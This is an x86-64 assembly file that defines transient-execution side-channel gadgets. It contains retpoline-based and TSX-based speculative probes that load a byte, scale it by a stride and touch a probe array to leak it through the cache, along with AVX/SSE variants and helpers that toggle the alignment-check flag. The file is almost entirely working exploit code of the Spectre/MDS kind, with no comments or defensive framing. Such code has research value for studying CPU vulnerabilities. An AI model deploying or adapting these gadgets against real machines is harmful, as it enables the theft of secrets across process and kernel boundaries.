.text
.globl enable_ac
enable_ac:
	pushf
	orq $(1 << 18), (%rsp)
	popf
	ret

.text
.globl disable_ac
disable_ac:
	pushf
	andq $~(1 << 18), (%rsp)
	popf
	ret

.text
.globl retpol_probe
retpol_probe:
	call 1f
	movzbq (%rsi), %rax
	shlq $STRIDE_SHIFT, %rax
	movzbq (%rdi, %rax), %rax

1:
	leaq 2f(%rip), %rax
.rept 64
	imulq $1, %rax, %rax
.endr
	movq %rax, (%rsp)
	ret

2:
	ret

.global tsx_probe
tsx_probe:
	xbegin 1f
.rept 16
	vsqrtps %xmm0, %xmm0
.endr
	movzbq (%rsi), %rax
	shlq $STRIDE_SHIFT, %rax
	movzbq (%rdi, %rax), %rax
	xend
1:
	ret

.text
.globl retpol_probe2
retpol_probe2:
	call 1f
	movzbq (%rsi), %rax
	movzbq (%rsi), %r11
	shlq $STRIDE_SHIFT, %rax
	shlq $STRIDE_SHIFT, %r11
	movq (%rdi, %rax), %rax
	movq (%rdi, %r11), %r11

1:
	leaq 2f(%rip), %rax
.rept 64
	imulq $1, %rax, %rax
.endr
	movq %rax, (%rsp)
	ret

2:
	ret

.global tsx_probe2
tsx_probe2:
	xbegin 1f
.rept 16
	vsqrtps %xmm0, %xmm0
.endr
	movzbq (%rsi), %rax
	movzbq (%rsi), %r11
	shlq $STRIDE_SHIFT, %rax
	shlq $STRIDE_SHIFT, %r11
	movq (%rdi, %rax), %rax
	movq (%rdi, %r11), %r11
	xend
1:
	ret

.global tsx_probe_shift
tsx_probe_shift:
	movq %rdx, %rcx
	xbegin 1f
.rept 16
	vsqrtps %xmm0, %xmm0
.endr
	movdqu (%rsi), %xmm0
	movq %xmm0, %rax
	shr %cl, %rax
	and $0xff, %rax
	shl $STRIDE_SHIFT, %rax
	movzbq (%rdi, %rax), %rax
	xend
1:
	ret

.global avx_probe
avx_probe:
	vmovdqu (%rsi), %ymm0
	movq %xmm0, %rax
	andq $0xff, %rax
	shl $STRIDE_SHIFT, %rax
	movq (%rdi, %rax), %rax
	ret

.global sse_probe
sse_probe:
	vmovdqu (%rsi), %ymm0
	movq %xmm0, %rax
	andq $0xff, %rax
	shl $STRIDE_SHIFT, %rax
	movq (%rdi, %rax), %rax
	ret

.global probe
probe:
	movq (%rsi), %rax
	andq $0xff, %rax
	shl $STRIDE_SHIFT, %rax
	movq (%rdi, %rax), %rax
	ret

